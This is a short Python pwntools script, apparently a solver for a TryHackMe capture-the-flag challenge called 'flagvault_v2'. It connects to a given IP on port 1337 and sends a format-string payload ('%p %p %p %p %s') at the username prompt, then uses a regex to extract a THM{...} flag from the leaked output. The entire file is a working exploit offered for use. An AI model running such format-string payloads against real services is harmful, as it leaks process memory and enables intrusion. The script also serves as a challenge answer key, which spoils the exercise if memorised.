from pwn import *
import re

def solve_flagvault_v2(task_name=None, ip=None):
    if ip is None:
        print("[-] IP address is required for this solver.")
        return

    port = 1337
    print(f"[*] Connecting to {ip}:{port}...")

    try:
        conn = remote(ip, port)
        conn.recvuntil(b"Username:")
        conn.sendline(b"%p %p %p %p %s")
        response = conn.recvall(timeout=3).decode(errors="ignore")

        match = re.search(r"(THM\{.*?\})", response)
        if match:
            print(f"[+] FLAG FOUND: {match.group(1)}")
        else:
            print("[-] Flag not found.")
            print(response)

    except Exception as e:
        print(f"[!] Connection failed: {e}")
